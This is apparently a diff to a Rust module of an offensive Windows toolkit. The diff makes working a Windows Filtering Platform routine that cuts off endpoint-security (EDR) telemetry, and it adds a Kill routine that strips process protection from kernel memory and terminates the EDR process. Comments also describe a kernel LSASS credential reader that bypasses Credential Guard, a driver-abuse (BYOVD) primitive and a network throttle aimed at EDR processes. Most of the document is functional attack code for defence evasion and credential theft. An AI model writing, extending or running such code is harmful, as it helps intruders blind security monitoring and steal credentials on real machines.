@@ -1,24 +1,28 @@
 //! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
 //!
 //! These three are more operator-orchestrated than the EPROCESS/callback kits:
-//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — would add WFP
-//!   filter rules that drop the EDR's outbound telemetry. **STATUS: explicitly
-//!   dead** — the per-PID block filter cannot be populated (WFP has no PID
-//!   condition; the correct `FWPM_CONDITION_ALE_APP_ID` needs pid→image-path
-//!   resolution, not wired), so the install path always returns `Err` rather
-//!   than installing a zero-condition rule that blocks ALL outbound IPv4.
-//!   Only the rule-shape logic (`rules_for`) is live.
+//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
+//!   block filters that drop the EDR's outbound telemetry. Implemented:
+//!   pid → image path (`QueryFullProcessImageNameW`) → AppId
+//!   (`FwpmGetAppIdFromFileName0`) → a single `FWPM_CONDITION_ALE_APP_ID`
+//!   condition on `FWPM_LAYER_ALE_AUTH_CONNECT_V4`. Any resolution/FFI
+//!   failure refuses with `Err` — there is no zero-condition fallback
+//!   (P0-9). Runtime-verified on-target; host tests cover the condition/
+//!   filter data shape.
 //! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
 //!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
 //!   (page walk + read loop). **Address-space contract:** requires a
 //!   *physical*-addressing `KernelRw` (see [`KernelRwAddressSpace`]); the
 //!   1 MiB image-base window is sparse-tolerant (unmapped pages are skipped)
 //!   but does NOT cover the heap-resident credential regions.
-//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
-//!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
-//!   Choke (QoS throttle). **STATUS: Choke refuses** — the per-process QoS
-//!   filter cannot be populated without AppId/image-path resolution, so it
-//!   returns a clear error instead of throttling the operator's own process.
+//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (data-write
+//!   PPL strip via `KernelRw` + user-mode `TerminateProcess` with protection
+//!   rollback on failure; bypasses PPL without any code-page write), Freeze
+//!   (user-mode WerFaultSecure coma), Choke (policy-based QoS throttle — the
+//!   real EDRChoker mechanics: a WMI `MSFT_NetQosPolicySettingData` ActiveStore
+//!   policy keyed on the target's resolved image path, backed by pacer.sys).
+//!   Choke refuses loudly when pid→image-path resolution or the WMI policy
+//!   creation fails — there is no unconditioned/self-throttle fallback.
 //!
 //! All unit-tested where the algorithm is pure; the user-mode tiers are
 //! framework (operator wires the Win32 calls at link time).
@@ -27,15 +31,16 @@ use crate::offsets::EprocessOffsets;
 use crate::pagewalk::PhysRead;
 use crate::persistence::ProcessHider;
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
-#[cfg(target_os = "windows")]
 use alloc::format;
+#[cfg(any(target_os = "windows", test))]
+use alloc::string::String;
 use alloc::vec::Vec;
 
 // ---- KernelRw address-space contract (kernelsdk-2-1) -----------------------
 //
 // `KernelRw::kread/kwrite` (lib.rs) documents its addresses as kernel
 // **virtual** addresses — that is the base contract every impl satisfies
-// (`ByovdDriver`/RtCore64, `LivingOffDefender`, `VaKernelRw`, …).
+// (`ByovdDriver`/Shield, `LivingOffDefender`, `VaKernelRw`, …).
 //
 // The CredKit page-walk path below ([`KrwPhysRead`] + [`KernelLsassReader::read_process_mem`])
 // additionally needs a `KernelRw` that interprets addresses as **physical**:
@@ -117,25 +122,26 @@ impl<'a> PhysRead for KrwPhysRead<'a> {
 
 // ---- §2.4 WfpKit ----------------------------------------------------------
 
-/// User-mode EDR silencer: would add Windows Filtering Platform rules that
-/// block the EDR's PIDs from sending telemetry. Admin-only, **no driver** —
-/// the lowest-friction option, at the cost of Event ID 5447 (filter add) +
+/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
+/// the EDR's outbound IPv4 telemetry. Admin-only, **no driver** — the
+/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
 /// packet-drop traces in the WFP event log. The kernel-tier alternative
 /// (overwriting the WFP callout) needs a KernelRw and is lower noise but
 /// higher risk.
 ///
-/// **STATUS: explicitly dead (kernelsdk-2-3).** The install path
-/// (`silence_edr` → `wfp_open_silence_session` → `block_outbound_for_pid`)
-/// ALWAYS returns `Err`: WFP has no PID filter condition, and the correct
-/// `FWPM_CONDITION_ALE_APP_ID` condition needs pid→image-path resolution that
-/// is not wired. The old zero-condition filter would block ALL outbound IPv4
-/// (cutting the host's network), so the code refuses instead — there is
-/// deliberately no working install path. Only the rule-shape logic
-/// (`rules_for`) is live and tested.
+/// **Implementation (P0-9 fix):** WFP has no PID filter condition, so each
+/// rule is conditioned on `FWPM_CONDITION_ALE_APP_ID` — resolved as
+/// pid → image path (`OpenProcess` + `QueryFullProcessImageNameW`) →
+/// `FwpmGetAppIdFromFileName0`. Every filter carries exactly ONE condition
+/// (`num_filter_conditions = 1`); there is deliberately no zero-condition
+/// fallback, because a condition-less filter on `ALE_AUTH_CONNECT_V4` matches
+/// ALL outbound IPv4 traffic (cutting the host's whole network). Any
+/// resolution or FFI failure (exited process, access denied / PPL, BFE down)
+/// returns `Err` before a filter exists.
 ///
-/// The framework contract still holds: the operator binary binds
-/// `FwpmEngineOpen0` / `FwpmFilterAdd0` and feeds the rule template here once
-/// image-path resolution lands.
+/// The framework contract holds: the operator binary binds `FwpmEngineOpen0`
+/// / `FwpmFilterAdd0` / `FwpmGetAppIdFromFileName0` at link time (resolved
+/// from fwpuclnt.dll via [`crate::win::resolve::resolve_sym`]).
 pub struct UserModeEdrSilencer;
 
 /// A WFP filter rule template: drop traffic from `pid` matching `protocol`
@@ -276,14 +282,15 @@ impl WfpSilenceGuard {
 // ---- WFP FFI (fwpuclnt.dll) ----
 //
 // FwpmEngineOpen0 opens a session to the BFE (Base Filtering Engine).
+// FwpmGetAppIdFromFileName0 resolves an exe path to an AppId FWP_BYTE_BLOB
+//   (BFE-allocated; released with FwpmFreeMemory0).
 // FwpmFilterAdd0 adds a filter that blocks traffic matching conditions.
-// FwpmFilterDeleteByKey0 removes a filter (cleanup).
+// FwpmEngineClose0 closes the session (auto-removes session-scoped filters).
 //
-// All three are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
-// Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/
+// All are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
+// pid→image-path resolution uses kernel32 OpenProcess +
+// QueryFullProcessImageNameW. Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/
 
-/// Open a WFP engine session + add outbound block filters for each EDR PID.
-/// Returns the filter IDs (for cleanup via FwpmFilterDeleteByKey0).
 /// Open a WFP engine session + install outbound block filters for each rule.
 ///
 /// Returns a [`WfpSilenceGuard`] that owns the engine session — dropping it
@@ -344,9 +351,16 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
         filter_ids: Vec::with_capacity(rules.len()),
     };
 
-    // 2. Add a block filter for each EDR PID (outbound, all protocols).
+    // 2. Add an AppId-conditioned block filter for each EDR PID (outbound, IPv4).
     for rule in rules {
-        let filter = FwpmFilter0::block_outbound_for_pid(rule.pid)?;
+        // `prepared` owns the BFE-allocated AppId blob + the one-condition
+        // array pointing at it; `filter` borrows both. Both stay alive until
+        // AFTER FwpmFilterAdd0 returns (Rust drops in reverse declaration
+        // order: filter, then prepared → FwpmFreeMemory0 on the blob). If
+        // pid→AppId resolution fails, `?` propagates BEFORE any filter for
+        // this rule exists, and `guard`'s Drop rolls back earlier filters.
+        let prepared = PreparedFilter::block_outbound_for_pid(rule.pid)?;
+        let filter = prepared.filter();
         let mut filter_id: u64 = 0;
         let st = unsafe { add(guard.engine_handle, &filter, core::ptr::null(), &mut filter_id) };
         if st != 0 {
@@ -367,58 +381,327 @@ fn wfp_open_silence_session(_rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, 
     Err(KitError::UnsupportedPosture("WFP FFI is Windows-only"))
 }
 
-/// FWPM_FILTER0 structure (simplified — only the fields we set).
-/// Full struct is 96 bytes on x64; we zero-init + set the fields that matter.
-#[cfg(target_os = "windows")]
+// ---- WFP data shapes (host-testable) ----
+//
+// The GUID constants, FFI struct layouts, and the condition/filter
+// construction below are pure data — no FFI calls. They are compiled for
+// Windows (real use) and for `cfg(test)` (host-side layout/value tests), so
+// host non-test builds stay warning-free. The Windows-only plumbing
+// (pid→image path, AppId resolution, RAII blob) follows after them.
+
+/// A Windows GUID in memory layout: the DWORD + two WORDs are serialized
+/// little-endian, the trailing 8 bytes verbatim. `align(4)` matches the SDK's
+/// GUID alignment so struct offsets below match the real SDK layouts.
+#[cfg(any(target_os = "windows", test))]
+#[repr(C, align(4))]
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+struct Guid([u8; 16]);
+
+/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connect, IPv4).
+/// SDK: {c38d57d1-05a7-4c33-904f-7fbceee60e82}.
+#[cfg(any(target_os = "windows", test))]
+const LAYER_ALE_AUTH_CONNECT_V4: Guid = Guid([
+    0xD1, 0x57, 0x8D, 0xC3, 0xA7, 0x05, 0x33, 0x4C, 0x90, 0x4F, 0x7F, 0xBC, 0xEE, 0xE6, 0x0E, 0x82,
+]);
+
+/// The GUID for FWPM_CONDITION_ALE_APP_ID — the per-application condition,
+/// matched against the AppId blob resolved from the target's image path.
+/// SDK: {d78e1e87-8644-4ea5-9437-d809ecefc971}.
+#[cfg(any(target_os = "windows", test))]
+const CONDITION_ALE_APP_ID: Guid = Guid([
+    0x87, 0x1E, 0x8E, 0xD7, 0x44, 0x86, 0xA5, 0x4E, 0x94, 0x37, 0xD8, 0x09, 0xEC, 0xEF, 0xC9, 0x71,
+]);
+
+/// FWP_MATCH_EQUAL — exact-match condition.
+#[cfg(any(target_os = "windows", test))]
+const FWP_MATCH_EQUAL: u32 = 0;
+/// FWP_BYTE_BLOB_TYPE — the FWP_CONDITION_VALUE0 carries an FWP_BYTE_BLOB*.
+#[cfg(any(target_os = "windows", test))]
+const FWP_BYTE_BLOB_TYPE: u32 = 12;
+/// FWP_ACTION_BLOCK = 0x0001 | FWP_ACTION_FLAG_TERMINATING (0x1000).
+#[cfg(any(target_os = "windows", test))]
+const FWP_ACTION_BLOCK: u32 = 0x1001;
+
+/// FWP_BYTE_BLOB — `{ UINT32 size; UINT8* data; }`.
+#[cfg(any(target_os = "windows", test))]
 #[repr(C)]
-struct FwpmFilter0 {
-    filter_key: [u8; 16],    // GUID (zero = auto-generate)
-    display_data: [u64; 2],  // FWPM_DISPLAY_DATA0* (null)
-    flags: u32,              // FWPM_FILTER_FLAG_NONE = 0
-    action_type: u32,        // FWP_ACTION_BLOCK = 0x0001
-    action_filter: [u64; 2], // FWP_CONDITION0* (null for simple block)
-    layer_key: [u8; 16],     // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
-    sublayer_key: [u8; 16],  // zero = default sublayer
-    weight: [u64; 2],        // FWP_VALUE0 (type + union) — set high
-    num_filter_conditions: u32,
-    filter_conditions: *const core::ffi::c_void, // FWP_FILTER_CONDITION0 array
-    provider_key: *const u8,                     // null
-    provider_data: [u64; 2],                     // FWP_BYTE_BLOB* (null)
-    key16: [u16; 16],                            // reserved
+struct FwpByteBlob {
+    size: u32,
+    data: *mut u8,
 }
 
-/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
-/// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
+/// FWP_CONDITION_VALUE0 — `{ FWP_DATA_TYPE type; union { … } }`. We only ever
+/// use the `byteBlob` union arm, so the union is modeled as that one pointer
+/// (pointer-sized, same layout).
+#[cfg(any(target_os = "windows", test))]
+#[repr(C)]
+struct FwpConditionValue0 {
+    value_type: u32,
+    byte_blob: *mut FwpByteBlob,
+}
+
+/// FWPM_FILTER_CONDITION0 — `{ GUID fieldKey; FWP_MATCH_TYPE matchType;
+/// FWP_CONDITION_VALUE0 conditionValue; }` (40 bytes on x64).
+#[cfg(any(target_os = "windows", test))]
+#[repr(C)]
+struct FwpmFilterCondition0 {
+    field_key: Guid,
+    match_type: u32,
+    condition_value: FwpConditionValue0,
+}
+
+/// Build the single `FWPM_CONDITION_ALE_APP_ID` / `FWP_MATCH_EQUAL` condition
+/// for an AppId blob. Pure data construction — host-testable. The blob is
+/// borrowed: the caller must keep `app_id` valid until `FwpmFilterAdd0` has
+/// returned (see [`PreparedFilter`]).
+#[cfg(any(target_os = "windows", test))]
+fn ale_app_id_condition(app_id: *mut FwpByteBlob) -> FwpmFilterCondition0 {
+    FwpmFilterCondition0 {
+        field_key: CONDITION_ALE_APP_ID,
+        match_type: FWP_MATCH_EQUAL,
+        condition_value: FwpConditionValue0 {
+            value_type: FWP_BYTE_BLOB_TYPE,
+            byte_blob: app_id,
+        },
+    }
+}
+
+/// FWPM_FILTER0 — full SDK layout on x64 (200 bytes). Fields we don't use are
+/// zeroed; the ones that matter are `layer_key`, `num_filter_conditions` /
+/// `filter_conditions`, and `action_type`.
+///
+/// Cross-checked against the SDK header (`fwpmtypes.h`) / docs.rs windows-sys
+/// `FWPM_FILTER0` — per-field x64 offsets (pinned by
+/// `wfp_filter0_field_offsets_match_sdk`):
+/// ```text
+///   0   filterKey          GUID                 (16)
+///   16  displayData        FWPM_DISPLAY_DATA0   { wchar_t* name; wchar_t* desc }
+///   32  flags              UINT32
+///   40  providerKey        GUID*                (8, align 8)
+///   48  providerData       FWP_BYTE_BLOB        (16)
+///   64  layerKey           GUID
+///   80  subLayerKey        GUID
+///   96  weight             FWP_VALUE0           { UINT32 type; union (8) @104 }
+///   112 numFilterConditions UINT32
+///   120 filterCondition    FWPM_FILTER_CONDITION0*
+///   128 action             FWPM_ACTION0         { UINT32 type; GUID union @132 } (20)
+///   152 rawContext/providerContext union { UINT64; GUID } (16, align 8)
+///   168 reserved           GUID*  ← a POINTER in the SDK, not an embedded GUID
+///   176 filterId           UINT64 (OUT)
+///   184 effectiveWeight    FWP_VALUE0           (16)
+/// ```
+#[cfg(any(target_os = "windows", test))]
+#[repr(C)]
+struct FwpmFilter0 {
+    filter_key: Guid,                          // 0: zero = auto-generate
+    display_name: *const u16,                  // 16: FWPM_DISPLAY_DATA0.name (null)
+    display_desc: *const u16,                  // 24: FWPM_DISPLAY_DATA0.description (null)
+    flags: u32,                                // 32: FWPM_FILTER_FLAG_NONE = 0 (never PERSISTENT)
+    provider_key: *const Guid,                 // 40: null
+    provider_data: FwpByteBlob,                // 48: empty
+    layer_key: Guid,                           // 64: FWPM_LAYER_ALE_AUTH_CONNECT_V4
+    sublayer_key: Guid,                        // 80: zero = default sublayer
+    weight_type: u32,                          // 96: FWP_VALUE0.type = FWP_EMPTY (0) → auto weight
+    weight_value: u64,                         // 104: FWP_VALUE0 union (unused)
+    num_filter_conditions: u32,                // 112: ALWAYS 1 — see P0-9 below
+    filter_conditions: *const FwpmFilterCondition0, // 120
+    action_type: u32,                          // 128: FWPM_ACTION0.type = FWP_ACTION_BLOCK
+    action_guid: Guid,                         // 132: FWPM_ACTION0 union (unused for block)
+    raw_context: [u64; 2], // 152: { UINT64 rawContext; GUID providerContext } union (16 bytes)
+    reserved: *const Guid, // 168: SDK reserved pointer — always null
+    filter_id: u64,        // 176: OUT (0 on input)
+    effective_weight_type: u32, // 184: FWP_VALUE0 (OUT)
+    effective_weight_value: u64, // 192: FWP_VALUE0 union (OUT)
+}
+
+#[cfg(any(target_os = "windows", test))]
+impl FwpmFilter0 {
+    /// Build an outbound block filter on `ALE_AUTH_CONNECT_V4` conditioned on
+    /// exactly one AppId condition. `conditions` must point at a single
+    /// [`FwpmFilterCondition0`] (from [`ale_app_id_condition`]) that stays
+    /// valid until `FwpmFilterAdd0` returns.
+    ///
+    /// **SECURITY (P0-9):** `num_filter_conditions` is hard-wired to 1. Per
+    /// the WFP contract, 0 conditions means *"match ALL traffic on this
+    /// layer"* — every outbound IPv4 packet on the host, not just the EDR's.
+    /// There is deliberately no constructor that can produce that.
+    fn block_outbound_app_id(conditions: *const FwpmFilterCondition0) -> Self {
+        FwpmFilter0 {
+            filter_key: Guid([0; 16]),
+            display_name: core::ptr::null(),
+            display_desc: core::ptr::null(),
+            flags: 0,
+            provider_key: core::ptr::null(),
+            provider_data: FwpByteBlob {
+                size: 0,
+                data: core::ptr::null_mut(),
+            },
+            layer_key: LAYER_ALE_AUTH_CONNECT_V4,
+            sublayer_key: Guid([0; 16]),
+            weight_type: 0,
+            weight_value: 0,
+            num_filter_conditions: 1,
+            filter_conditions: conditions,
+            action_type: FWP_ACTION_BLOCK,
+            action_guid: Guid([0; 16]),
+            raw_context: [0; 2],
+            reserved: core::ptr::null(),
+            filter_id: 0,
+            effective_weight_type: 0,
+            effective_weight_value: 0,
+        }
+    }
+}
+
+// ---- pid → AppId resolution (Windows-only plumbing) ----
+
+/// PROCESS_QUERY_LIMITED_INFORMATION (0x1000) — the minimum access needed for
+/// QueryFullProcessImageNameW; works against more targets than full
+/// PROCESS_QUERY_INFORMATION (protected-light processes still refuse, which
+/// is a legitimate Err, not a fallback trigger).
 #[cfg(target_os = "windows")]
-#[allow(dead_code)] // WFP layer GUID — reserved for future netsec filter registration
-const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
-    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B, 0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
-];
+const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
+
+/// Resolve a pid to its image path as a NUL-terminated UTF-16 buffer, in the
+/// drive-letter form `FwpmGetAppIdFromFileName0` accepts.
+///
+/// Any failure (process exited, access denied / PPL) is a hard `Err` — the
+/// caller NEVER falls back to an unconditioned filter.
+#[cfg(target_os = "windows")]
+fn resolve_image_path_wide(pid: u32) -> Result<Vec<u16>, KitError> {
+    use core::ffi::c_void;
+
+    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+    type QueryFullProcessImageNameWFn =
+        unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut u32) -> i32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let open_process: OpenProcessFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
+            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
+    let query_name: QueryFullProcessImageNameWFn = unsafe {
+        crate::win::resolve::resolve_sym(b"kernel32.dll", b"QueryFullProcessImageNameW")
+    }
+    .map_err(|_| KitError::Other("QueryFullProcessImageNameW unresolved".into()))?;
+    let close_handle: CloseHandleFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
+            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;
+
+    let h_process = unsafe { open_process(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
+    if h_process.is_null() {
+        return Err(KitError::Other(format!(
+            "OpenProcess(QUERY_LIMITED_INFORMATION) failed for pid {} — process exited or \
+             access denied (PPL/protected); refusing to install an unconditioned filter",
+            pid
+        )));
+    }
+
+    let mut buf = [0u16; 1024];
+    let mut size: u32 = buf.len() as u32;
+    let ok = unsafe { query_name(h_process, 0, buf.as_mut_ptr(), &mut size) };
+    let _ = unsafe { close_handle(h_process) };
+    if ok == 0 || size == 0 || size as usize >= buf.len() {
+        return Err(KitError::Other(format!(
+            "QueryFullProcessImageNameW failed for pid {} — cannot resolve the image path; \
+             refusing to install an unconditioned filter",
+            pid
+        )));
+    }
+
+    let mut path = Vec::with_capacity(size as usize + 1);
+    path.extend_from_slice(&buf[..size as usize]);
+    path.push(0); // NUL-terminate for the PCWSTR FFI arg
+    Ok(path)
+}
+
+/// Owned AppId blob returned by `FwpmGetAppIdFromFileName0`. The BFE allocates
+/// it, so it MUST be released with `FwpmFreeMemory0` (not the process heap) —
+/// the Drop impl does exactly that. Keep it alive until `FwpmFilterAdd0` has
+/// copied the condition out (see [`PreparedFilter`]).
+#[cfg(target_os = "windows")]
+struct AppIdBlob {
+    blob: *mut FwpByteBlob,
+}
 
 #[cfg(target_os = "windows")]
-impl FwpmFilter0 {
-    /// Build a WFP filter that blocks the target's outbound IPv4 traffic.
-    ///
-    /// **SECURITY (P0-9):** the previous implementation set
-    /// `num_filter_conditions = 0`. Per the WFP contract that means *"match ALL
-    /// traffic on this layer"* — i.e. it silently blocked EVERY outbound IPv4
-    /// packet on the host, not just the EDR's. WFP cannot filter on PID (PIDs
-    /// are not a valid filter condition and are reused); the correct condition
-    /// is `FWPM_CONDITION_ALE_APP_ID`, resolved from the exe path via
-    /// `FwpmGetAppIdFromFileName0`. That needs a pid→image-path resolution
-    /// (NtQuerySystemInformation) which is not wired here yet. Rather than ship
-    /// a rule that nukes the host's entire network, we REFUSE to build the
-    /// filter and return an error so `silence_edr` propagates it loudly instead
-    /// of silently cutting the box off the network.
+impl AppIdBlob {
+    /// pid → image path → AppId blob. Any failure returns `Err` before a blob
+    /// exists — there is no fallback path.
+    fn for_pid(pid: u32) -> Result<Self, KitError> {
+        type FwpmGetAppIdFromFileName0Fn =
+            unsafe extern "system" fn(*const u16, *mut *mut FwpByteBlob) -> u32;
+        let get_app_id: FwpmGetAppIdFromFileName0Fn = unsafe {
+            crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmGetAppIdFromFileName0")
+        }
+        .map_err(|_| KitError::Other("FwpmGetAppIdFromFileName0 unresolved".into()))?;
+
+        let path = resolve_image_path_wide(pid)?;
+        let mut blob: *mut FwpByteBlob = core::ptr::null_mut();
+        let st = unsafe { get_app_id(path.as_ptr(), &mut blob) };
+        if st != 0 || blob.is_null() {
+            return Err(KitError::Other(format!(
+                "FwpmGetAppIdFromFileName0 failed for pid {}: {}",
+                pid, st
+            )));
+        }
+        Ok(Self { blob })
+    }
+}
+
+#[cfg(target_os = "windows")]
+impl Drop for AppIdBlob {
+    fn drop(&mut self) {
+        type FwpmFreeMemory0Fn = unsafe extern "system" fn(*mut *mut core::ffi::c_void);
+        if !self.blob.is_null() {
+            if let Ok(free) = unsafe {
+                crate::win::resolve::resolve_sym::<FwpmFreeMemory0Fn>(
+                    b"fwpuclnt.dll",
+                    b"FwpmFreeMemory0",
+                )
+            } {
+                let mut p = self.blob as *mut core::ffi::c_void;
+                let _ = unsafe { free(&mut p) };
+            }
+            // Null regardless of free success: Drop must be idempotent.
+            self.blob = core::ptr::null_mut();
+        }
+    }
+}
+
+/// Everything `FwpmFilterAdd0` must see alive for the duration of the call:
+/// the BFE-owned AppId blob plus the one-element condition array that points
+/// at it. Build the `FWPM_FILTER0` via [`Self::filter`], pass it to
+/// `FwpmFilterAdd0`, and only then drop this value — the blob is released
+/// (via `FwpmFreeMemory0`) after the add has copied the condition.
+///
+/// **SECURITY (P0-9):** the previous implementation installed a filter with
+/// `num_filter_conditions = 0` ("match ALL outbound IPv4" — silently cutting
+/// the host's whole network) and was replaced by an always-`Err` stub. This
+/// type is the real fix: WFP has no PID filter condition, so the filter is
+/// conditioned on `FWPM_CONDITION_ALE_APP_ID`, resolved from the target's
+/// image path. Any resolution failure returns `Err` BEFORE a filter exists.
+#[cfg(target_os = "windows")]
+struct PreparedFilter {
+    // Held purely for its Drop (FwpmFreeMemory0 on the BFE-owned blob) — the
+    // filter reaches the blob's memory through `condition`, not this field.
+    #[allow(dead_code)]
+    app_id: AppIdBlob,
+    condition: FwpmFilterCondition0,
+}
+
+#[cfg(target_os = "windows")]
+impl PreparedFilter {
     fn block_outbound_for_pid(pid: u32) -> Result<Self, KitError> {
-        let _ = pid; // kept for diagnostics / future ALE_APP_ID resolution
-        Err(KitError::Other(
-            "WFP PID-based outbound block not implemented: refusing to install a filter with \
-             num_filter_conditions=0 (which matches ALL outbound IPv4 traffic, not just the \
-             target PID). Resolve pid to image-path and condition on \
-             FWPM_CONDITION_ALE_APP_ID before enabling this."
-                .into(),
-        ))
+        let app_id = AppIdBlob::for_pid(pid)?;
+        let condition = ale_app_id_condition(app_id.blob);
+        Ok(Self { app_id, condition })
+    }
+
+    /// The `FWPM_FILTER0` to hand to `FwpmFilterAdd0`. Borrows
+    /// `self.condition` (and transitively the AppId blob) — both outlive the
+    /// add call by construction at the call site.
+    fn filter(&self) -> FwpmFilter0 {
+        FwpmFilter0::block_outbound_app_id(&self.condition)
     }
 }
 
@@ -522,7 +805,7 @@ impl KernelLsassReader {
     /// `kread`, then walks + reads page tables and payload through physical
     /// addresses. It therefore requires a `KernelRw` whose `kread` interprets
     /// addresses as **physical** (see [`KernelRwAddressSpace::Physical`]) —
-    /// the base VA-based impls (RtCore64 `ByovdDriver`, `LivingOffDefender`,
+    /// the base VA-based impls (Shield `ByovdDriver`, `LivingOffDefender`,
     /// `VaKernelRw`) fail the walk with a clear error, not garbage. Every
     /// physical address is validated with [`is_plausible_phys_address`]
     /// before use, so a VA/PA mix-up errors out instead of silently returning
@@ -699,14 +982,16 @@ impl CredKit for KernelLsassReader {
 
 // ---- §2.5 EdrNeutralizeKit ------------------------------------------------
 
-/// EDR process neutralizer. Kill (kernel ZwTerminateProcess, bypasses PPL) is
-/// the only tier that needs a KernelRw; Freeze + Choke are user-mode.
+/// EDR process neutralizer. Kill (data-write PPL strip + user-mode
+/// TerminateProcess, bypasses PPL) is the only tier that needs a KernelRw;
+/// Freeze + Choke are user-mode.
 ///
 /// The `EdrNeutralizeKit` trait's `neutralize()` doesn't pass a `KernelRw`,
-/// so the Kill tier exposes a separate `kill()` associated function that takes
-/// one directly. The operator calls `kill()` when they have kernel R/W access;
-/// `neutralize(Kill)` is a convenience that requires the `kill()` helper to
-/// have been called first (or returns a framework error).
+/// so the Kill tier exposes [`EdrNeutralizer::kill`], which takes one directly.
+/// The operator calls `kill()` when they have kernel R/W access;
+/// `neutralize(Kill)` refuses and points at `kill()` (it cannot strip PPL
+/// without a `KernelRw`, so a bare user-mode terminate attempt against a
+/// protected target would be a false-positive machine).
 pub struct EdrNeutralizer {
     /// Resolved KVA of `PsActiveProcessHead`. Required by the Kill tier to
     /// walk the process list and find the target EPROCESS by PID.
@@ -715,36 +1000,193 @@ pub struct EdrNeutralizer {
     pub offsets: EprocessOffsets,
 }
 
+/// The saved `Protection` / `SignatureLevel` / `SectionSignatureLevel` bytes
+/// of a process, captured before a PPL strip so the strip can be rolled back
+/// if the follow-up terminate fails (see [`EdrNeutralizer::kill`]).
+struct ProtectionSnapshot {
+    protection: u8,
+    signature_level: u8,
+    section_signature_level: u8,
+}
+
+impl ProtectionSnapshot {
+    /// Read the three protection bytes of `eprocess_kva`, then zero them
+    /// (same data-only strip as `PplStripper::strip_protection`, but with the
+    /// pre-strip bytes captured for rollback). HVCI-safe: data writes only.
+    fn strip(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        offsets: &EprocessOffsets,
+    ) -> Result<Self, KitError> {
+        // A non-canonical EPROCESS KVA means find_eprocess returned garbage;
+        // writing protection bytes there would corrupt unrelated kernel memory.
+        if eprocess_kva < 0xFFFF_8000_0000_0000 {
+            return Err(KitError::UnsupportedPosture(
+                "non-canonical EPROCESS KVA — refusing to strip protection on a corrupt address",
+            ));
+        }
+        let mut rd = |off: usize| -> Result<u8, KitError> {
+            let mut b = [0u8; 1];
+            krw.kread(eprocess_kva + off, &mut b).map_err(KitError::from)?;
+            Ok(b[0])
+        };
+        let snap = ProtectionSnapshot {
+            protection: rd(offsets.protection)?,
+            signature_level: rd(offsets.signature_level)?,
+            section_signature_level: rd(offsets.section_signature_level)?,
+        };
+        krw.kwrite(eprocess_kva + offsets.protection, &[0u8])
+            .map_err(KitError::from)?;
+        krw.kwrite(eprocess_kva + offsets.signature_level, &[0u8])
+            .map_err(KitError::from)?;
+        krw.kwrite(eprocess_kva + offsets.section_signature_level, &[0u8])
+            .map_err(KitError::from)?;
+        Ok(snap)
+    }
+
+    /// Write the saved bytes back. Called when the terminate step fails so a
+    /// failed Kill never leaves the target silently unprotected.
+    fn restore(
+        &self,
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        offsets: &EprocessOffsets,
+    ) -> Result<(), KitError> {
+        krw.kwrite(eprocess_kva + offsets.protection, &[self.protection])
+            .map_err(KitError::from)?;
+        krw.kwrite(eprocess_kva + offsets.signature_level, &[self.signature_level])
+            .map_err(KitError::from)?;
+        krw.kwrite(
+            eprocess_kva + offsets.section_signature_level,
+            &[self.section_signature_level],
+        )
+        .map_err(KitError::from)?;
+        Ok(())
+    }
+}
+
+/// Terminate `pid` from user mode (`OpenProcess(PROCESS_TERMINATE)` +
+/// `TerminateProcess`). Only viable after [`ProtectionSnapshot::strip`] has
+/// removed the target's PPL — a protected-light process refuses the open.
+/// Windows-only FFI (kernel32); every failure propagates.
+#[cfg(target_os = "windows")]
+fn terminate_process_user_mode(pid: u32) -> Result<(), KitError> {
+    use core::ffi::c_void;
+
+    /// PROCESS_TERMINATE = 0x0001 — sufficient once PPL is stripped.
+    const PROCESS_TERMINATE: u32 = 0x0001;
+
+    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+    type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let open_process: OpenProcessFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
+            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
+    let terminate_process: TerminateProcessFn =
